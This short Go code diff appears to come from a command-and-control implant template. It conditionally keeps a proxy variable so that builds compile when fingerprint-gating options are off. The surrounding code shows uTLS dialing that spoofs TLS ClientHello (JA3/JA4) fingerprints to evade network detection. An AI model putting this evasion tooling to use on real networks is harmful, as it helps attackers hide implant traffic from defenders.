@@ -70,7 +70,13 @@ func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, er
 		Timeout:   opts.NetTimeout,
 		Transport: transport,
 	}
+	// proxyURL 仅在指纹门控生效时才需要作为返回值;
+	// 默认(全关)配置下保持与上游一致的调用形态,避免未使用变量导致编译失败。
+	// {{if or .HTTPC2ImplantConfig.TlsEnabled .HTTPC2ImplantConfig.HttpHeaderOrder .HTTPC2ImplantConfig.HttpSuppressHeaders}}
 	proxyURL := parseProxyConfig(origin, transport, opts.ProxyConfig)
+	// {{else}}
+	parseProxyConfig(origin, transport, opts.ProxyConfig)
+	// {{end}}
 	// {{if .HTTPC2ImplantConfig.TlsEnabled}}
 	// uTLS 接管 HTTPS 拨号以定制 ClientHello(JA3/JA4)。
 	// 注意:transport 在 DialTLSContext 生效时会忽略 Proxy 字段,
